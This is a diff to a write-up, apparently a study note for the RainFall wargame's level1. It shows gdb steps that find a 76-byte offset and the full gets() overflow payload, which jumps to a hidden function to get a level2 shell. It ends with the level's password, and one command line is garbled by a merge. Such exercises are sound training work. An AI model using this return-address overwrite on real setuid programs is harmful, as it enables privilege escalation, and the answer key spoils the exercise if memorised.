@@ -22,6 +22,8 @@ String dump of section '.rodata':
        0x08048496 <+22>:	ret    
     End of assembler dump.
 #+end_src
+** Main data
+use ~gets~ for change return of main function to shellcode or function.
 ** Search  for symbols
 #+begin_src shell :tangle no
    readelf -s level1
@@ -35,7 +37,7 @@ String dump of section '.rodata':
       40: 00000000     0 FILE    LOCAL  DEFAULT  ABS level1.c -> below are functions defined in the file
       50: 08048444    60 FUNC    GLOBAL DEFAULT   13 run -> a function inside maybe interesting
 #+end_src
-** Binary analisys
+*** Binary analisys
 #+begin_src shell :tangle no
 gdb -batch -ex 'file level1' -ex 'set disassembly-flavor intel' -ex 'disassemble run'
    0x08048444 <+0>:	push   ebp
@@ -84,6 +86,38 @@ Specifically, the kernel checks if the process is being traced (e.g., by gdb). I
 Use the buffer on the main for change the return and execute run function.
 ** How To:
 *** Detect the offset to reach  the return.
+**** Math way
+Get the return and the buffer begin addr.
+#+begin_src shell
+     0x08048490 <+16>:	call   0x8048340 <gets@plt>
+     0x08048495 <+21>:	leave  
+     0x08048496 <+22>:	ret    
+  End of assembler dump.
+  (gdb) b * 0x08048490
+#+end_src
+***** Get  the return va  
+****** With breakpoint in function
+#+begin_src shell
+    (gdb) r
+      x/a $ebp + 4 
+      0xbffffc5c:	0xb7e454d3 <__libc_start_main+243> # The part before :
+#+end_src
+Or
+#+begin_src shell
+info frame 
+Stack level 0, frame at 0xbffffc60:
+ eip = 0x8048490 in main; saved eip 0xb7e454d3
+ Arglist at 0xbffffc58, args: 
+ Locals at 0xbffffc58, Previous frame's sp is 0xbffffc60
+ Saved registers:
+  ebp at 0xbffffc58, eip at 0xbffffc5c# This last one is the interesting.
+#+end_src
+***** Get  the offset  to return va.
+#+begin_src shell
+      (gdb) p/d ($ebp + 4) -$eax
+      $1 = 76
+#+end_src
+**** Pattern Generator
 # https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 #+begin_src shell :tangle no
 
@@ -92,7 +126,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 Program received signal SIGSEGV, Segmentation fault.
 0x63413563 in ?? () # offset 76
 #+end_src
-*** Detect the va  off  run.
+*** Detect the va off  run.
 #+begin_src shell :tangle no
     (gdb) jump run # jump to run function
     Continuing at 0x804844a. # run va
@@ -138,9 +172,10 @@ Examples:
 #+begin_src shell
     p exit
   $1 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
-
-  python -c 'print("A"*76 + "\x44\x84\x04\x08" + "\xe0\xeb\xe5\xb7")' > /tmp/level1 
-  level1@RainFall:~$ cat /tmp/level1 - | ./level1
+  #+end_src
+  Ge got the  addres of exit
+  #+begin_src shell
+  level1@RainFall:~$(python -c 'print("A"*76 + "\x44\x84\x04\x08" + "\xe0\xeb\xe5\xb7")'; cat -) | ./level1 cat /tmp/level1 - | ./level1
   Good... Wait what?
   id
   uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
@@ -152,10 +187,9 @@ Examples:
 ***** We want  to exit with X status.
 append the status code u want  to pass to exit in this case _X = 0_.
 #+begin_src shell
-python -c 'print("A"*76 + "\x44\x84\x04\x08" + "\xe0\xeb\xe5\xb7" +  "\x00"*4)' > /tmp/level1 
-level1@RainFall:~$ cat /tmp/level1 - | ./level1
-Good... Wait what?
-level1@RainFall:~$ echo $?
-0
+(python -c 'print("A"*76 + "\x44\x84\x04\x08" + "\xe0\xeb\xe5\xb7" +  "\x00"*4)'; cat -) | ./level1
+  Good... Wait what?
+  level1@RainFall:~$ echo $?
+  0
 #+end_src
 level2_pass=53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
